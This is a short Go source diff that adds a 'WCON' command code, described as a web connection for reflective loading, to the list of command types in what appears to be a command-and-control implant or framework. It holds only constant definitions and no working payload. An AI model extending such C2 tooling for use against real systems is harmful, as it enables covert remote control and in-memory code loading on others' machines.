@@ -43,9 +43,10 @@ const (
 
 // CommandType represents the type of C2 command
 const (
-	CommandContinued = "COMU" // Command unfinished
-	CommandDone      = "COMD" // Command finished
-	CommandKill      = "KILL" // Kill command
-	CommandPing      = "PING" // Ping command
-	CommandOutput    = "COMO" // Command output
+	CommandContinued  = "COMU" // Command unfinished
+	CommandDone       = "COMD" // Command finished
+	CommandKill       = "KILL" // Kill command
+	CommandPing       = "PING" // Ping command
+	CommandOutput     = "COMO" // Command output
+	CommandWebConnect = "WCON" // Web connection for reflective loading
 )
